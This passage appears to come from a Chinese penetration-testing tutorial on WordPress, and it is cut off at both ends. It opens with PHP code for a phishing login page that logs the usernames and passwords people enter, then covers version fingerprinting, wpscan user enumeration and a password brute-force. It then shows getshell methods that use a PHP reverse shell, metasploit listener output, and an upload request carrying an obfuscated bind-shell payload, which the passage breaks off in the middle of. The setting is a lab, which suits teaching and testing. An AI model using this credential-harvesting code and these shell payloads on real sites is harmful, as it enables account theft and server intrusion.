    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"redirect_to"</span> <span class="na">value</span><span class="o">=</span><span class="s">"http://localhost/wp-admin/"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"testcookie"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1"</span> <span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">setcookie</span><span class="p">(</span><span class="s1">'redirected'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">);</span>
<span class="nv">$u</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'log'</span><span class="p">];</span>
<span class="nv">$p</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pwd'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'log'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pwd'</span><span class="p">])){</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'/var/log/accesss.log'</span><span class="p">,</span><span class="nv">$u</span><span class="o">.</span><span class="nv">$p</span><span class="p">);</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'redirected'</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /admin'</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>当正常访问登录页面时 就会被重定向到钓鱼页面<br/>
输入账号密码后将重定向到真实登录页面 此时账号密码已被记录<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705059122210-1470f63b-1864-4fd9-a5ef-50b23b3630c4.png#averageHue=%23e0e0e0&amp;clientId=u73ac5ba2-244f-4&amp;from=paste&amp;height=756&amp;id=uc09dbcfc&amp;originHeight=1512&amp;originWidth=3086&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=186229&amp;status=done&amp;style=none&amp;taskId=u0aeb091c-26c5-4cae-8e23-d953661ac3a&amp;title=&amp;width=1543"/><br/>
在这个过程中尤其要注意目标写入文件的权限 防止warning</p>
<h2 data-content="1" id="ce69ac8eca07a5735fe0334f0312b33d">2.Wordpress渗透测试研究</h2>
<h2 data-content="1" id="c7fbf07724b889c705f84574e175b309">2.1主流工具</h2>
<h3 data-content="1" id="651de6df24803322bcd2b08dcc83d607">wpscan</h3>
<p>wpscan是一款使用ruby开发的跨平台wordpress扫描和渗透工具<br/>
<a href="https://github.com/wpscanteam/wpscan" target="_blank">GitHub - wpscanteam/wpscan: WPScan WordPress security scanner. Written for security professionals and blog maintainers to test the security of their WordPress websites. Contact us via contact@wpscan.com</a><br/>
扫描示例：</p>
<div class="highlight"><pre><span></span>wpscan --url http://localhost:81 --wp-content-dir /wp-content/ --enumerate vp --plugins-detection aggressive --api-token xxxxxxxxxxxxx
</pre></div>
<p>--wp-content-dir指定的是文章的路径<br/>
在许多使用wordpress框架的网站中 文章路径一般都不在/wp-content/所以提供了参数进行指定<br/>
--enumerate vp 可以枚举所有易受攻击的插件<br/>
--plugins-detection aggressive指定的是发现插件的方式 这里指定的是积极的方式<br/>
wpscan可以以三种方式检测插件：被动（从HTML源代码检测）、主动（检查插件默认文件的标准路径）和积极（执行更全面的检查）<br/>
--api-token指定的是wpscan官方提供的api<br/>
在wpscan.com官网进行注册后可以得到free版本的api 有了api才能连接漏洞库进行扫描</p>
<h3 data-content="1" id="1851a00bd66ca4f87592e07cda3a9448">cmsmap</h3>
<p>cmsmap是一款实用python开发的跨平台cms扫描工具 支持扫描WordPress、Joomla,、Drupal、Moodle<br/>
<a href="https://github.com/dionach/CMSmap" target="_blank">https://github.com/dionach/CMSmap</a><br/>
cmsmap实用exploitdb进行扫描 建议在kali等自带exploitdb的操作系统上使用 如果没有 也可以使用官方exploitdb<br/>
<a href="https://gitlab.com/exploit-database/exploitdb" target="_blank">Exploit-DB / Exploits + Shellcode + GHDB · GitLab</a></p>
<h2 data-content="1" id="bfa4fabec98764db5930c95187e5553f">2.2 wordpress版本侦查</h2>
<p>在实际渗透中 cms版本号可以帮助我们寻找历史漏洞进行利用<br/>
下面将演示一些主要方法</p>
<h3 data-content="1" id="c8246adb03c3a221159083a956564b1b">自述文件 - readme.thml</h3>
<p>这是最简单的技巧 只需访问/readme.html即可得到版本号<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1706251124395-3a4dc962-54e9-4d7b-8b35-53528bc6cc1f.png#averageHue=%23dedede&amp;clientId=u7a5cd868-df9a-4&amp;from=paste&amp;height=633&amp;id=uad60f524&amp;originHeight=1266&amp;originWidth=2656&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=209062&amp;status=done&amp;style=none&amp;taskId=u8b2ca45a-1f57-4827-8d1f-0bb71c6e293&amp;title=&amp;width=1328"/><br/>
该文件的目的是在初次安装时提供安装手册以及版本信息 在完成了wordpress的部署后应删除该文件</p>
<h3 data-content="1" id="1af2c87771dbd121d76765c34832c895">html元标签</h3>
<p>具有generator名称属性的元标记通常被描述为用于生成文档/网页的软件。确切的版本号在 meta 标签的content属性中公开<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1706251469308-89b034dc-22ed-46be-804b-75b04a3087dd.png#averageHue=%23bab8b8&amp;clientId=u7a5cd868-df9a-4&amp;from=paste&amp;height=206&amp;id=u0d2d2d73&amp;originHeight=412&amp;originWidth=1492&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=188487&amp;status=done&amp;style=none&amp;taskId=ue13cb025-35c1-4ca5-bb9b-8527ab80786&amp;title=&amp;width=746"/></p>
<h3 data-content="1" id="c8be728287b80ab00595a9cda2e0df5e">JavaScript || CSS</h3>
<p>在wp-admin/install.php、wp-admin/upgrade.php、wp-login.php文件的源代码中可以看到部分css链接的ver参数中携带了版本号<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1706251635389-0b73d083-7d98-44fc-821c-22ae5882321e.png#averageHue=%23d3d2d1&amp;clientId=u7a5cd868-df9a-4&amp;from=paste&amp;height=328&amp;id=u6a8ad267&amp;originHeight=656&amp;originWidth=1656&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=155586&amp;status=done&amp;style=none&amp;taskId=ue9256720-a8ee-405f-a6fb-002acfb1e15&amp;title=&amp;width=828"/></p>
<h3 data-content="1" id="6f0c0719a6f92d75d75debdff5cc391a">Feed</h3>
<p>Feed是一种数据格式，它允许用户订阅频繁更新的内容，如博客文章、新闻、音频或视频系列等。RSS是最常见的Feed格式之一<br/>
以下是feed checklist  不同wordpress版本下存在差异</p>
<ul>
<li>/index.php/feed/</li>
<li>/index.php/feed/rss/</li>
<li>/index.php/feed/rss2/</li>
<li>/index.php/comments/feed/</li>
<li>/index.php/feed/rdf/（文件在本地下载）</li>
<li>/index.php/feed/atom/</li>
<li>/?feed=atom</li>
<li>/?feed=rss</li>
<li>/?feed=rss2</li>
<li>/?feed=rdf</li>
</ul>
<p>以/?feed=rss为例 可以在?v参数中发现版本号<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1706252017423-2e7341fe-4d8a-4ff7-8a82-dccf35b97832.png#averageHue=%23969696&amp;clientId=u7a5cd868-df9a-4&amp;from=paste&amp;height=124&amp;id=u6551824e&amp;originHeight=248&amp;originWidth=3094&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=176048&amp;status=done&amp;style=none&amp;taskId=u9e3c4a79-0f5a-49e7-a788-49b20da38d0&amp;title=&amp;width=1547"/></p>
<h3 data-content="1" id="7ba7438200a0bb16eea646f69eb35a70">OPML</h3>
<p>OPML（Outline Processor Markup Language）是一种基于XML的格式，用于交换轮廓结构的信息。轮廓结构通常指的是嵌套的文本列表，类似于大纲或树状结构。OPML在多种应用中都很有用，尤其是在共享和迁移RSS订阅列表的场景中。<br/>
但此文件也会纰漏版本信息<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1706252112012-f246abff-e8bf-4c0c-a23c-21fae95ff491.png#averageHue=%23c8c8c8&amp;clientId=u7a5cd868-df9a-4&amp;from=paste&amp;height=304&amp;id=uaa6b9105&amp;originHeight=608&amp;originWidth=1234&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=114731&amp;status=done&amp;style=none&amp;taskId=u307d3a44-6fa3-4e79-8e78-c5e0cbe9de3&amp;title=&amp;width=617"/></p>
<h3 data-content="1" id="81d2febff28c51c5c993741fea9da7c8">MD5比较</h3>
<p>通过比对js静态文件md5与特征库中的md5来判断cms版本 这也是漏扫工具进行指纹识别的常用方法<br/>
使用find命令结合参数计算所有js文件md5<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1706253349610-032e47d5-b77c-4b5b-bbcb-474e0f1fbe10.png#averageHue=%234c5062&amp;clientId=u7a5cd868-df9a-4&amp;from=paste&amp;height=333&amp;id=ubdfc0517&amp;originHeight=666&amp;originWidth=1606&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=316192&amp;status=done&amp;style=none&amp;taskId=u33d5b899-590f-4975-a45e-2c974b9463c&amp;title=&amp;width=803"/><br/>
md5特征库可以查看这个项目<a href="https://github.com/philipjohn/exploit-scanner-hashes" target="_blank">https://github.com/philipjohn/exploit-scanner-hashes</a></p>
<h2 data-content="1" id="6399a2a60a2d37828b6cc4f5486d27c0">2.3 getshell测试案例</h2>
<p>环境使用wpscan开发团队提供的VulnerableWordpress进行部署 版本为4.2.1</p>
<div class="highlight"><pre><span></span>-&gt; git clone https://github.com/wpscanteam/VulnerableWordpress.git
-&gt; <span class="nb">cd</span> VulnerableWordpress/
-&gt; docker build --rm -t wpscan/vulnerablewordpress .<span class="se">\</span>
-&gt; docker run --name vulnerablewordpress -d -p <span class="m">81</span>:80 -p <span class="m">3307</span>:3306 wpscan/vulnerablewordpress
</pre></div>
<p>访问127.0.0.1:81 初始化过程略<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705136492103-8bcfbf42-404c-4a79-8b0f-f17cd656807f.png#averageHue=%23dfdfdf&amp;clientId=uad14354d-ef7d-4&amp;from=paste&amp;height=836&amp;id=u635ac550&amp;originHeight=1672&amp;originWidth=3078&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=284245&amp;status=done&amp;style=none&amp;taskId=uf17d4505-1056-413b-8354-087a3dc7c73&amp;title=&amp;width=1539"/><br/>
使用wpscan进行用户枚举</p>
<div class="highlight"><pre><span></span>-&gt; wpscan --url http://localhost:81/ --enumerate
<span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+<span class="o">]</span> may
 <span class="p">|</span> Found By: Author Posts - Display Name <span class="o">(</span>Passive Detection<span class="o">)</span>
 <span class="p">|</span> Confirmed By:
 <span class="p">|</span>  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</pre></div>
<p>获得用户名may，爆破密码</p>
<div class="highlight"><pre><span></span><span class="o">[</span>+<span class="o">]</span> Performing password attack on Xmlrpc Multicall against <span class="m">1</span> user/s
Progress Time: <span class="m">00</span>:00:00 &lt;<span class="o">===========================================================================================================</span>&gt; <span class="o">(</span><span class="m">0</span> / <span class="m">0</span><span class="o">)</span> <span class="m">100</span>.0% Time: <span class="m">00</span>:00:00
WARNING: Your progress bar is currently at <span class="m">0</span> out of <span class="m">0</span> and cannot be incremented. In v2.0.0 this will become a ProgressBar::InvalidProgressError.
Progress Time: <span class="m">00</span>:00:00 &lt;<span class="o">===========================================================================================================</span>&gt; <span class="o">(</span><span class="m">0</span> / <span class="m">0</span><span class="o">)</span> <span class="m">100</span>.0% Time: <span class="m">00</span>:00:00
<span class="o">[</span>SUCCESS<span class="o">]</span> - may / <span class="m">123456</span>
All Found
</pre></div>
<p>得到用户名密码may/123456<br/>
得到管理员用户密码就可以使用后台getshell的常用手法 下文将演示常见方法</p>
<h3 data-content="1" id="da4114a08bf5bfbeb9d454c1e2f431c6">方法1、修改模板</h3>
<p>后台 -&gt; 外观 -&gt; 编辑<br/>
通过在index.php、404.php等模板中嵌入恶意代码进行正向或反连shell<br/>
嵌入php_reverse_shell.php代码<br/>
<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a><br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705928239544-9197060c-d7fb-4b21-b6de-30e21ee3b009.png#averageHue=%23e2e2e2&amp;clientId=uc39f9627-399e-4&amp;from=paste&amp;height=853&amp;id=u09e9adf9&amp;originHeight=1706&amp;originWidth=3094&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=488325&amp;status=done&amp;style=none&amp;taskId=u435abfea-c3db-406b-859c-143b26626fd&amp;title=&amp;width=1547"/><br/>
使用metasploit等工具建立监听</p>
<div class="highlight"><pre><span></span>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; show options

Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <span class="o">(</span>php/reverse_php<span class="o">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  <span class="m">0</span>.0.0.0          yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT  <span class="m">9999</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="m">0</span>   Wildcard Target
</pre></div>
<p>更新index.php后访问wordpress首页即可接收到shell</p>
<div class="highlight"><pre><span></span>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; exploit

<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on <span class="m">0</span>.0.0.0:9999
<span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">10</span> opened <span class="o">(</span><span class="m">192</span>.168.0.106:9999 -&gt; <span class="m">192</span>.168.0.106:58096<span class="o">)</span> at <span class="m">2024</span>-01-22 <span class="m">20</span>:54:00 +0800


Shell Banner:
Linux 2036cf3ffda3 <span class="m">6</span>.5.13-orbstack-00121-ge428743e4e98 <span class="c1">#1 SMP Wed Dec 27 10:22:46 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux</span>
 <span class="m">12</span>:53:55 up  <span class="m">1</span>:07,  <span class="m">0</span> users,  load average: <span class="m">1</span>.32, <span class="m">1</span>.06, <span class="m">0</span>.89
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: <span class="m">0</span>: can<span class="err">'</span>t access tty<span class="p">;</span> job control turned off
$
</pre></div>
<h3 data-content="1" id="d2971a636daafd898cc99706a95b6a1e">方法2、zip上传</h3>
<p>将php_reverse_shell.php压缩为zip 在插件安装页面上传zip<br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705928820683-3560e5f2-fcf7-4542-b23e-e7868e6ee7fb.png#averageHue=%23d9d9d9&amp;clientId=uc39f9627-399e-4&amp;from=paste&amp;height=613&amp;id=u97f34d8a&amp;originHeight=1226&amp;originWidth=3094&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=245185&amp;status=done&amp;style=none&amp;taskId=u6d0bb817-7940-4980-9f3d-ea098eddbc7&amp;title=&amp;width=1547"/><br/>
建立监听 稍等片刻即可获得shell<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705928908230-f785138f-35b6-45f2-8e4c-e83a9b9cfd85.png#averageHue=%2336393f&amp;clientId=uc39f9627-399e-4&amp;from=paste&amp;height=380&amp;id=u36cc8d33&amp;originHeight=760&amp;originWidth=2350&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=253609&amp;status=done&amp;style=none&amp;taskId=u42c88f76-4fc3-424e-8e1f-ecd741c0f65&amp;title=&amp;width=1175"/></p>
<h3 data-content="1" id="c8b24fa4240a70f89e346ead7c22d4ac">方法3、php上传</h3>
<p>直接在插件安装页面上传php_reverse_shell.php 然后在/wp-content/includes/中访问<br/>
上传过程中会发生报错 但不影响文件正常上传和访问</p>
<h3 data-content="1" id="f1253ade641007e0c93179d13779e3b9">方法4、安装脆弱插件</h3>
<p>比如安装wp_responsive-thumbnail-slider 1.0<br/>
<a href="https://github.com/wp-plugins/wp-responsive-thumbnail-slider/blob/master/wp-responsive-images-thumbnail-slider.php" target="_blank">https://github.com/wp-plugins/wp-responsive-thumbnail-slider/blob/master/wp-responsive-images-thumbnail-slider.php</a><br/>
<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705929451952-7393e2dd-f60b-473b-847e-6b5a2d54d6a1.png#averageHue=%23d9d9d9&amp;clientId=uc39f9627-399e-4&amp;from=paste&amp;height=610&amp;id=u354fe16b&amp;originHeight=1220&amp;originWidth=3094&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=217350&amp;status=done&amp;style=none&amp;taskId=ue3b1c50c-2cc4-4347-b1f2-5a2f438adc7&amp;title=&amp;width=1547"/><br/>
安装并启用后使用metasploit的multi/http/wp_responsive_thumbnail_slider_upload模块进行攻击<br/>
但在使用这个模块时发现攻击不成功 打开msfconsole的httptrace功能 检查一下交互流量<br/>
shell上传流量 响应状态码200 检查后发现文件上传成功</p>
<div class="highlight"><pre><span></span>POST /wp-admin/admin.php?page<span class="o">=</span>responsive_thumbnail_slider_image_management/<span class="p">&amp;</span><span class="nv">action</span><span class="o">=</span>addedit HTTP/1.1
Host: <span class="m">127</span>.0.0.1:81
User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X <span class="m">14</span>.0<span class="p">;</span> rv:109.0<span class="o">)</span> Gecko/20100101 Firefox/118.0
Cookie: <span class="nv">wordpress_test_cookie</span><span class="o">=</span>WP+Cookie+check<span class="p">;</span> <span class="nv">wordpress_6c4a121fd069bf4e2556e12b7efdd957</span><span class="o">=</span>may%7C1706103384%7Cui79L7HaD6Tg7KSz4Klp4rrYC5nGMuTiSyjaHFqiA8A%7Cc6f4177388dc93f4dbf79d2e82f47164644463acddf110de7c2abfbe1c97e5d7<span class="p">;</span> <span class="nv">wordpress_6c4a121fd069bf4e2556e12b7efdd957</span><span class="o">=</span>may%7C1706103384%7Cui79L7HaD6Tg7KSz4Klp4rrYC5nGMuTiSyjaHFqiA8A%7Cc6f4177388dc93f4dbf79d2e82f47164644463acddf110de7c2abfbe1c97e5d7<span class="p">;</span> <span class="nv">wordpress_logged_in_6c4a121fd069bf4e2556e12b7efdd957</span><span class="o">=</span>may%7C1706103384%7Cui79L7HaD6Tg7KSz4Klp4rrYC5nGMuTiSyjaHFqiA8A%7C813c527b5d99bb083c2e43068cc63c66c41836fc5d3fc42883b8390f8da744a2<span class="p">;</span>
Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span>---------------------------743289811480519521793446209521
Content-Length: <span class="m">2471</span>

-----------------------------743289811480519521793446209521
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"image_name"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"KSXrN.php"</span>
Content-Type: image/jpeg

&lt;?php @unlink<span class="o">(</span>__FILE__<span class="o">)</span><span class="p">;</span> /*&lt;?php /**/  @error_reporting<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>@set_time_limit<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>@ignore_user_abort<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>@ini_set<span class="o">(</span><span class="s1">'max_execution_time'</span>,0<span class="o">)</span><span class="p">;</span>  <span class="nv">$BDQbE</span><span class="o">=</span>@ini_get<span class="o">(</span><span class="s1">'disable_functions'</span><span class="o">)</span><span class="p">;</span>  <span class="k">if</span><span class="o">(</span>!empty<span class="o">(</span><span class="nv">$BDQbE</span><span class="o">)){</span>  <span class="nv">$BDQbE</span><span class="o">=</span>preg_replace<span class="o">(</span><span class="s1">'/[, ]+/'</span>,<span class="s1">','</span>,<span class="nv">$BDQbE</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$BDQbE</span><span class="o">=</span>explode<span class="o">(</span><span class="s1">','</span>,<span class="nv">$BDQbE</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$BDQbE</span><span class="o">=</span>array_map<span class="o">(</span><span class="s1">'trim'</span>,<span class="nv">$BDQbE</span><span class="o">)</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span><span class="o">{</span>  <span class="nv">$BDQbE</span><span class="o">=</span>array<span class="o">()</span><span class="p">;</span>  <span class="o">}</span>    <span class="nv">$port</span><span class="o">=</span><span class="m">9999</span><span class="p">;</span>   <span class="nv">$scl</span><span class="o">=</span><span class="s1">'socket_create_listen'</span><span class="p">;</span>  <span class="k">if</span><span class="o">(</span>is_callable<span class="o">(</span><span class="nv">$scl</span><span class="o">)&amp;&amp;</span>!in_array<span class="o">(</span><span class="nv">$scl</span>,<span class="nv">$BDQbE</span><span class="o">)){</span>  <span class="nv">$sock</span><span class="o">=</span>@<span class="nv">$scl</span><span class="o">(</span><span class="nv">$port</span><span class="o">)</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span><span class="o">{</span>  <span class="nv">$sock</span><span class="o">=</span>@socket_create<span class="o">(</span>AF_INET,SOCK_STREAM,SOL_TCP<span class="o">)</span><span class="p">;</span>  <span class="nv">$ret</span><span class="o">=</span>@socket_bind<span class="o">(</span><span class="nv">$sock</span>,0,<span class="nv">$port</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$ret</span><span class="o">=</span>@socket_listen<span class="o">(</span><span class="nv">$sock</span>,5<span class="o">)</span><span class="p">;</span>  <span class="o">}</span>  <span class="nv">$msgsock</span><span class="o">=</span>@socket_accept<span class="o">(</span><span class="nv">$sock</span><span class="o">)</span><span class="p">;</span>  @socket_close<span class="o">(</span><span class="nv">$sock</span><span class="o">)</span><span class="p">;</span>   <span class="k">while</span><span class="o">(</span>FALSE!<span class="o">==</span>@socket_select<span class="o">(</span><span class="nv">$r</span><span class="o">=</span>array<span class="o">(</span><span class="nv">$msgsock</span><span class="o">)</span>, <span class="nv">$w</span><span class="o">=</span>NULL, <span class="nv">$e</span><span class="o">=</span>NULL, NULL<span class="o">))</span>  <span class="o">{</span>  <span class="nv">$o</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>  <span class="nv">$c</span><span class="o">=</span>@socket_read<span class="o">(</span><span class="nv">$msgsock</span>,2048,PHP_NORMAL_READ<span class="o">)</span><span class="p">;</span>  <span class="k">if</span><span class="o">(</span><span class="nv">FALSE</span><span class="o">===</span><span class="nv">$c</span><span class="o">){</span>break<span class="p">;</span><span class="o">}</span>  <span class="k">if</span><span class="o">(</span>substr<span class="o">(</span><span class="nv">$c</span>,0,3<span class="o">)</span> <span class="o">==</span> <span class="s1">'cd '</span><span class="o">){</span>  chdir<span class="o">(</span>substr<span class="o">(</span><span class="nv">$c</span>,3,-1<span class="o">))</span><span class="p">;</span>  <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span>substr<span class="o">(</span><span class="nv">$c</span>,0,4<span class="o">)</span> <span class="o">==</span> <span class="s1">'quit'</span> <span class="o">||</span> substr<span class="o">(</span><span class="nv">$c</span>,0,4<span class="o">)</span> <span class="o">==</span> <span class="s1">'exit'</span><span class="o">)</span> <span class="o">{</span>  break<span class="p">;</span>  <span class="o">}</span><span class="k">else</span><span class="o">{</span>    <span class="k">if</span> <span class="o">(</span>FALSE !<span class="o">==</span> stristr<span class="o">(</span>PHP_OS, <span class="s1">'win'</span> <span class="o">))</span> <span class="o">{</span>  <span class="nv">$c</span><span class="o">=</span><span class="nv">$c</span>.<span class="s2">" 2&gt;&amp;1\n"</span><span class="p">;</span>  <span class="o">}</span>  <span class="nv">$PFeofv</span><span class="o">=</span><span class="s1">'is_callable'</span><span class="p">;</span>  <span class="nv">$jikigJe</span><span class="o">=</span><span class="s1">'in_array'</span><span class="p">;</span>    <span class="k">if</span><span class="o">(</span><span class="nv">$PFeofv</span><span class="o">(</span><span class="s1">'shell_exec'</span><span class="o">)&amp;&amp;</span>!<span class="nv">$jikigJe</span><span class="o">(</span><span class="s1">'shell_exec'</span>,<span class="nv">$BDQbE</span><span class="o">)){</span>  <span class="nv">$o</span><span class="o">=</span><span class="sb">`</span><span class="nv">$c</span><span class="sb">`</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span>  <span class="k">if</span><span class="o">(</span><span class="nv">$PFeofv</span><span class="o">(</span><span class="s1">'exec'</span><span class="o">)&amp;&amp;</span>!<span class="nv">$jikigJe</span><span class="o">(</span><span class="s1">'exec'</span>,<span class="nv">$BDQbE</span><span class="o">)){</span>  <span class="nv">$o</span><span class="o">=</span>array<span class="o">()</span><span class="p">;</span>  exec<span class="o">(</span><span class="nv">$c</span>,<span class="nv">$o</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$o</span><span class="o">=</span>join<span class="o">(</span>chr<span class="o">(</span><span class="m">10</span><span class="o">)</span>,<span class="nv">$o</span><span class="o">)</span>.chr<span class="o">(</span><span class="m">10</span><span class="o">)</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span>  <span class="k">if</span><span class="o">(</span><span class="nv">$PFeofv</span><span class="o">(</span><span class="s1">'system'</span><span class="o">)&amp;&amp;</span>!<span class="nv">$jikigJe</span><span class="o">(</span><span class="s1">'system'</span>,<span class="nv">$BDQbE</span><span class="o">)){</span>  ob_start<span class="o">()</span><span class="p">;</span>  system<span class="o">(</span><span class="nv">$c</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$o</span><span class="o">=</span>ob_get_contents<span class="o">()</span><span class="p">;</span>  ob_end_clean<span class="o">()</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span>  <span class="k">if</span><span class="o">(</span><span class="nv">$PFeofv</span><span class="o">(</span><span class="s1">'passthru'</span><span class="o">)&amp;&amp;</span>!<span class="nv">$jikigJe</span><span class="o">(</span><span class="s1">'passthru'</span>,<span class="nv">$BDQbE</span><span class="o">)){</span>  ob_start<span class="o">()</span><span class="p">;</span>  passthru<span class="o">(</span><span class="nv">$c</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$o</span><span class="o">=</span>ob_get_contents<span class="o">()</span><span class="p">;</span>  ob_end_clean<span class="o">()</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span>  <span class="k">if</span><span class="o">(</span><span class="nv">$PFeofv</span><span class="o">(</span><span class="s1">'popen'</span><span class="o">)&amp;&amp;</span>!<span class="nv">$jikigJe</span><span class="o">(</span><span class="s1">'popen'</span>,<span class="nv">$BDQbE</span><span class="o">)){</span>  <span class="nv">$fp</span><span class="o">=</span>popen<span class="o">(</span><span class="nv">$c</span>,<span class="s1">'r'</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$o</span><span class="o">=</span>NULL<span class="p">;</span>  <span class="k">if</span><span class="o">(</span>is_resource<span class="o">(</span><span class="nv">$fp</span><span class="o">)){</span>  <span class="k">while</span><span class="o">(</span>!feof<span class="o">(</span><span class="nv">$fp</span><span class="o">)){</span>  <span class="nv">$o</span>.<span class="o">=</span>fread<span class="o">(</span><span class="nv">$fp</span>,1024<span class="o">)</span><span class="p">;</span>  <span class="o">}</span>  <span class="o">}</span>  @pclose<span class="o">(</span><span class="nv">$fp</span><span class="o">)</span><span class="p">;</span>  <span class="o">}</span><span class="k">else</span>  <span class="k">if</span><span class="o">(</span><span class="nv">$PFeofv</span><span class="o">(</span><span class="s1">'proc_open'</span><span class="o">)&amp;&amp;</span>!<span class="nv">$jikigJe</span><span class="o">(</span><span class="s1">'proc_open'</span>,<span class="nv">$BDQbE</span><span class="o">)){</span>  <span class="nv">$handle</span><span class="o">=</span>proc_open<span class="o">(</span><span class="nv">$c</span>,array<span class="o">(</span>array<span class="o">(</span><span class="s1">'pipe'</span>,<span class="s1">'r'</span><span class="o">)</span>,array<span class="o">(</span><span class="s1">'pipe'</span>,<span class="s1">'w'</span><span class="o">)</span>,array<span class="o">(</span><span class="s1">'pipe'</span>,<span class="s1">'w'</span><span class="o">))</span>,<span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span>  <span class="nv">$o</span><span class="o">=</span>NULL<span class="p">;</span>  <span class="k">while</span><span class="o">(</span>!feof<span 